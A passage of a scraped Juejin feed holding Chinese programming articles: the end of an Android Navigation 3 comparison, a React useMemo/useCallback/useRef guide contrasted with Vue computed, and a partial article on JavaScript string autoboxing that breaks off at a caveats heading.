<table><thead><tr><th>方面</th><th>Navigation 2</th><th>Navigation 3</th></tr></thead><tbody><tr><td><strong>设计目标</strong></td><td>Views &amp; Compose 兼容</td><td>仅 Compose</td></tr><tr><td><strong>返回栈管理</strong></td><td>库内部管理（黑盒）</td><td>开发者完全掌控</td></tr><tr><td><strong>路由定义</strong></td><td>字符串或 NavGraphBuilder DSL</td><td>data class/object</td></tr><tr><td><strong>参数传递</strong></td><td>SafeArgs / Bundle</td><td>直接属性访问</td></tr><tr><td><strong>状态控制</strong></td><td>NavController</td><td>NavigationState + Navigator</td></tr><tr><td><strong>多窗格布局</strong></td><td>需要额外处理</td><td>原生 Scene 支持</td></tr><tr><td><strong>嵌套导航</strong></td><td>支持多层嵌套</td><td>目前仅支持单层</td></tr></tbody></table>
<h2 data-id="heading-12">迁移建议</h2>
<p>如果你正在考虑迁移到 Navigation 3：</p>
<p><strong>适合迁移的场景：</strong></p>
<ul>
<li>• 纯 Compose 应用</li>
<li>• 需要自适应布局（手机/平板/桌面）</li>
<li>• 希望更好地控制导航状态</li>
<li>• 新项目或重构项目</li>
</ul>
<p><strong>暂时观望的场景：</strong></p>
<ul>
<li>• 依赖复杂深度链接</li>
<li>• 需要多层嵌套导航</li>
<li>• View 与 Compose 混合应用</li>
<li>• 对稳定性要求极高的生产环境</li>
</ul>
<h2 data-id="heading-13">总结</h2>
<p>Navigation 3 代表了 Android 导航方案的一次范式转变。它抛弃了老版本的历史包袱，完全拥抱 Compose 的声明式理念。虽然目前还有些功能尚未完善（如深度链接），但其清晰的 API 设计和对开发者的信任，让导航逻辑变得前所未有的透明和可控。</p>
<p>如果你正在开发新的 Compose 应用，Navigation 3 绝对值得一试。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[别再乱用 useMemo 了！React 性能优化三大缓存 Hook 对比 + 与 Vue computed 的本质区别]]></title>    <link>https://juejin.cn/post/7596865421612138550</link>    <guid>https://juejin.cn/post/7596865421612138550</guid>    <pubDate>2026-01-19T11:14:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596865421612138550" data-draft-id="7596883689826844735" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="别再乱用 useMemo 了！React 性能优化三大缓存 Hook 对比 + 与 Vue computed 的本质区别"/> <meta itemprop="keywords" content="React.js,前端,JavaScript"/> <meta itemprop="datePublished" content="2026-01-19T11:14:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="全栈打怪日记"/> <meta itemprop="url" content="https://juejin.cn/user/2269028453720813"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            别再乱用 useMemo 了！React 性能优化三大缓存 Hook 对比 + 与 Vue computed 的本质区别
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2269028453720813/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    全栈打怪日记
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T11:14:06.000Z" title="Mon Jan 19 2026 11:14:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>最近在 review 代码时，发现不少同学对 <code>useMemo</code> 的使用存在误解：</p>
<ul>
<li>有的地方该用不用，导致性能浪费；</li>
<li>有的地方滥用，反而增加开销；</li>
<li>更有人把它和 <code>useRef</code>、<code>useCallback</code> 混为一谈……</li>
</ul>
<p>今天，我就用<strong>一个简单例子 + 三大对比 + 一个灵魂拷问</strong>，带你彻底搞懂 <code>useMemo</code> 的正确打开方式！</p>
<h3 data-id="heading-0">一、先看一个经典场景：为什么需要 useMemo？</h3>
<p>假设我们有一个计数器，还有一个“切换主题”按钮：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ab945f7316694ca99ac99dd4597517ab~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YWo5qCI5omT5oCq5pel6K6w:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769426045&amp;x-signature=y338FC%2FDCzRQx63HBXalLJDN69I%3D" alt="carbon (3).png" loading="lazy"/></p>
<p>问题来了：<strong>当我点击“切换主题”时，<code>squared</code> 会重新计算吗？</strong></p>
<p>✅ 答案是：<strong>会！</strong><br/>
因为每次状态更新都会触发组件重新执行，<code>count * count</code> 就会被重复计算。</p>
<p>虽然乘法很快，但如果这是个复杂操作（如排序、格式化、深度克隆），就会造成<strong>不必要的性能损耗</strong>。</p>
<hr/>
<h3 data-id="heading-1">二、useMemo：只在依赖变化时才计算</h3>
<p>解决方案就是 —— <strong><code>useMemo</code></strong>！</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c84009f486a64b6db8e08d7b0f897e2b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YWo5qCI5omT5oCq5pel6K6w:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769426045&amp;x-signature=h7Hvqf%2Bs0ZIxCUcnhEWnl7FAO%2FE%3D" alt="carbon (4).png" loading="lazy"/></p>
<p>现在：</p>
<ul>
<li>点击  <strong>+1</strong> → 重新计算 ✅</li>
<li>点击 <strong>切换主题</strong> → 不计算 ❌（控制台无日志）</li>
</ul>
<blockquote>
<p>✨ <code>useMemo</code> 的作用：<strong>缓存计算结果，依赖不变就不重算。</strong></p>
</blockquote>
<hr/>
<h3 data-id="heading-2">三、三大缓存 Hook 对比：别再混用了！</h3>
<p>很多同学分不清 <code>useMemo</code>、<code>useCallback</code>、<code>useRef</code>，其实它们<strong>目标完全不同</strong>：</p>





























<table><thead><tr><th>Hook</th><th>缓存什么？</th><th>典型用途</th><th>返回值</th></tr></thead><tbody><tr><td><code>useRef</code></td><td>一个可变容器（<code>.current</code>）</td><td>存 DOM 引用、定时器 ID、跨渲染变量</td><td><code>{ current: T }</code></td></tr><tr><td><code>useCallback</code></td><td>函数</td><td>防止函数重建导致子组件重渲染</td><td><code>Function</code></td></tr><tr><td><code>useMemo</code></td><td>任意值（对象/数组/计算结果）</td><td>避免重复执行昂贵计算</td><td><code>T</code></td></tr></tbody></table>
<h4 data-id="heading-3">💡 一句话区分：</h4>
<ul>
<li>想缓存<strong>一个值</strong>（不是函数）→ <code>useMemo</code></li>
<li>想缓存<strong>一个函数</strong> → <code>useCallback</code></li>
<li>想存一个<strong>不触发渲染的变量</strong> → <code>useRef</code></li>
</ul>
<blockquote>
<p>⚠️ 常见误区：<br/>
“我用 <code>useRef</code> 存计算结果不就行了？”<br/>
→ 技术上可行，但你得手动判断依赖是否变化，<strong>极易出错且不可维护</strong>！</p>
</blockquote>
<hr/>
<h3 data-id="heading-4">四、灵魂拷问：React 的 useMemo vs Vue 的 computed？</h3>
<p>很多从 Vue 转 React 的同学会问：</p>
<blockquote>
<p>“<code>useMemo</code> 是不是就等于 Vue 的 <code>computed</code>？”</p>
</blockquote>
<p><strong>答案是：相似，但底层机制完全不同！</strong></p>






























<table><thead><tr><th>特性</th><th>Vue <code>computed</code></th><th>React <code>useMemo</code></th></tr></thead><tbody><tr><td>响应式原理</td><td>自动依赖追踪（Proxy 劫持）</td><td>手动声明依赖（依赖数组）</td></tr><tr><td>更新粒度</td><td>细粒度（只更新用到的数据）</td><td>组件级（整个函数重执行）</td></tr><tr><td>是否自动缓存</td><td>✅ 是</td><td>✅ 是（但需手动写）</td></tr><tr><td>心智模型</td><td>“数据变了，视图自动跟上”</td><td>“状态变了，我重新描述 UI”</td></tr></tbody></table>
<blockquote>
<p>🌰 举个例子：<br/>
在 Vue 中，你写 <code>computed: { fullName() { return this.firstName + this.lastName } }</code>，框架<strong>自动知道</strong>它依赖 <code>firstName</code> 和 <code>lastName</code>。<br/>
而在 React 中，你必须<strong>显式写出</strong> <code>[firstName, lastName]</code>，否则会用旧值！</p>
</blockquote>
<p>✅ 所以：</p>
<ul>
<li><strong>Vue 的 computed 更“智能”</strong></li>
<li><strong>React 的 useMemo 更“显式可控”</strong></li>
</ul>
<hr/>
<h3 data-id="heading-5">五、使用 useMemo 的 3 个最佳实践</h3>
<ol>
<li>
<p><strong>不要过早优化</strong><br/>
简单计算（如 <code>a + b</code>）不需要 <code>useMemo</code>，反而增加内存开销。</p>
</li>
<li>
<p><strong>依赖数组必须写全</strong><br/>
漏掉依赖会导致“stale closure”（闭包陷阱），用 ESLint 插件 <code>exhaustive-deps</code> 自动检查。</p>
</li>
<li>
<p><strong>主要用于以下场景</strong>：</p>
<ul>
<li>昂贵的计算（排序、过滤、格式化）</li>
<li>创建新对象/数组（避免子组件因引用变化重渲染）</li>
<li>传递 props 给 <code>React.memo</code> 包裹的子组件</li>
</ul>
</li>
</ol>
<hr/>
<h3 data-id="heading-6">六、总结</h3>
<ul>
<li><code>useMemo</code> 不是万能药，但它是<strong>性能优化的关键工具</strong>。</li>
<li>它和 <code>useCallback</code>、<code>useRef</code> 各司其职，<strong>不要混用</strong>。</li>
<li>与 Vue 的 <code>computed</code> 相比，React 更强调<strong>显式依赖声明</strong>，这是函数式思维的核心。</li>
</ul>
<blockquote>
<p>🔑 <strong>记住</strong>：<br/>
<strong>“useMemo 缓存的是值，useCallback 缓存的是函数，useRef 存的是盒子。”</strong></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[《深入理解 JavaScript：为什么基本类型 string 也能调用 .length？》]]></title>    <link>https://juejin.cn/post/7596883689826943039</link>    <guid>https://juejin.cn/post/7596883689826943039</guid>    <pubDate>2026-01-19T11:35:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596883689826943039" data-draft-id="7596883689826926655" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="《深入理解 JavaScript：为什么基本类型 string 也能调用 .length？》"/> <meta itemprop="keywords" content="JavaScript"/> <meta itemprop="datePublished" content="2026-01-19T11:35:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户80110532256"/> <meta itemprop="url" content="https://juejin.cn/user/1927884034804425"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            《深入理解 JavaScript：为什么基本类型 string 也能调用 .length？》
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1927884034804425/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户80110532256
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T11:35:24.000Z" title="Mon Jan 19 2026 11:35:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><hr/>
<h4 data-id="heading-0">前言</h4>
<p>在日常的 JavaScript 开发中，我们经常与字符串打交道。访问字符串的长度是再基础不过的操作了：</p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">str</span> = <span class="hljs-string">"hello"</span><span class="hljs-comment">;</span>
console.log(str.length)<span class="hljs-comment">; // 5</span>
</code></pre>
<p>这段代码看起来平平无奇，但你是否曾想过这样一个问题：<code>str</code> 是一个基本数据类型（primitive type）<code>string</code>，而我们知道基本数据类型本身是不能拥有属性和方法的。那么，为什么 <code>str.length</code> 却能正常工作呢？</p>
<p>今天，我们就来揭开这个看似简单操作背后的秘密——<strong>自动装箱（Autoboxing）</strong> 。</p>
<h4 data-id="heading-1">一、JavaScript 数据类型的分类</h4>
<p>在深入了解之前，我们先回顾一下 JavaScript 的数据类型。它们主要分为两大类：</p>
<ol>
<li>
<p><strong>基本数据类型 (Primitives)</strong> :</p>
<ul>
<li><code>number</code></li>
<li><code>string</code></li>
<li><code>boolean</code></li>
<li><code>null</code></li>
<li><code>undefined</code></li>
<li><code>symbol</code> (ES6 新增)</li>
<li><code>bigint</code> (ES2020 新增)</li>
<li><strong>特点</strong>: 基本类型的值是不可变的（immutable），并且本身没有属性和方法。</li>
</ul>
</li>
<li>
<p><strong>引用类型 (Objects)</strong> :</p>
<ul>
<li><code>Object</code></li>
<li><code>Array</code></li>
<li><code>Function</code></li>
<li><code>Date</code></li>
<li><code>RegExp</code></li>
<li>包括 <code>String</code>, <code>Number</code>, <code>Boolean</code> 等包装对象</li>
<li><strong>特点</strong>: 引用类型的值是可变的，拥有属性和方法。</li>
</ul>
</li>
</ol>
<h4 data-id="heading-2">二、String 对象 vs. string 基本类型</h4>
<p>当我们使用 <code>new String()</code> 语法时，创建的是一个 <code>String</code> 对象：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> primitiveStr = <span class="hljs-string">"hello"</span>;        <span class="hljs-comment">// 基本类型 string</span>
<span class="hljs-keyword">const</span> stringObj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">"hello"</span>); <span class="hljs-comment">// String 对象</span>

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">typeof</span> primitiveStr); <span class="hljs-comment">// "string"</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">typeof</span> stringObj);    <span class="hljs-comment">// "object"</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">toString</span>.<span class="hljs-title function_">call</span>(stringObj)); <span class="hljs-comment">// "[object String]"</span>
</code></pre>
<p>显然，<code>stringObj</code> 是一个对象，它自然拥有 <code>.length</code> 属性，这很好理解。</p>
<p>那么，问题就回到了最初的疑问：为什么 <code>primitiveStr</code> 这个基本类型也能访问 <code>.length</code>？</p>
<h4 data-id="heading-3">三、揭秘：自动装箱 (Autoboxing)</h4>
<p>答案就在 JavaScript 引擎为我们默默执行的“自动装箱”过程。</p>
<p>当你的代码试图访问一个基本数据类型值的属性或方法时（例如 <code>primitiveStr.length</code> 或 <code>primitiveStr.toUpperCase()</code>），JavaScript 引擎会按以下步骤操作：</p>
<ol>
<li><strong>临时创建对象</strong>: 引擎会根据基本类型的值，临时创建一个对应的包装对象。对于 <code>string</code>，则创建 <code>String</code> 对象；对于 <code>number</code>，则创建 <code>Number</code> 对象；对于 <code>boolean</code>，则创建 <code>Boolean</code> 对象。</li>
<li><strong>委托操作</strong>: 引擎将请求的属性或方法调用委托给这个新创建的临时对象。</li>
<li><strong>返回结果</strong>: 操作完成后，将结果返回。</li>
<li><strong>销毁对象</strong>: 这个临时创建的包装对象随即被销毁。</li>
</ol>
<p><strong>用代码来模拟这个过程：</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 当执行 primitiveStr.length 时，引擎内部大致做了这些事：</span>
<span class="hljs-keyword">const</span> tempStrObj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(primitiveStr); <span class="hljs-comment">// 1. 创建临时 String 对象</span>
<span class="hljs-keyword">const</span> length = tempStrObj.<span class="hljs-property">length</span>;            <span class="hljs-comment">// 2. 在临时对象上调用 .length</span>
<span class="hljs-comment">// tempStrObj 被销毁                        // 4. 销毁临时对象</span>
<span class="hljs-comment">// console.log(length); // 5               // 3. 返回结果</span>
</code></pre>
<p>正是因为这个临时的 <code>String</code> 对象的存在，我们才能在基本类型 <code>string</code> 上访问到 <code>.length</code> 属性以及其他字符串方法（如 <code>toUpperCase</code>, <code>substring</code>, <code>indexOf</code> 等）。</p>
<h4 data-id="heading-4">四、实践验证</h4>
<p>让我们通过一个例子来更直观地感受 <code>string</code> 基本类型和 <code>String</code> 对象的区别与联系：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> strBasic = <span class="hljs-string">"hello world"</span>;
<span class="hljs-keyword">const</span> strObj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">"hello world"</span>);

<span class="hljs-comment">// 两者都能访问 .length</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(strBasic.<span class="hljs-property">length</span>); <span class="hljs-comment">// 11 - 通过自动装箱访问</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(strObj.<span class="hljs-property">length</span>);   <span class="hljs-comment">// 11 - 直接访问对象属性</span>

<span class="hljs-comment">// 两者都能调用字符串方法</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(strBasic.<span class="hljs-title function_">toUpperCase</span>()); <span class="hljs-comment">// "HELLO WORLD" - 自动装箱后调用</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(strObj.<span class="hljs-title function_">toUpperCase</span>());   <span class="hljs-comment">// "HELLO WORLD" - 直接调用对象方法</span>

<span class="hljs-comment">// typeof 检查</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">typeof</span> strBasic); <span class="hljs-comment">// "string"</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">typeof</span> strObj);   <span class="hljs-comment">// "object"</span>

<span class="hljs-comment">// 获取原始值</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(strObj.<span class="hljs-title function_">valueOf</span>()); <span class="hljs-comment">// "hello world" - String 对象的方法</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(strObj + <span class="hljs-string">""</span>);      <span class="hljs-comment">// "hello world" - 隐式类型转换</span>
</code></pre>
<h4 data-id="heading-5">五、注意事项</h4>
<ol>
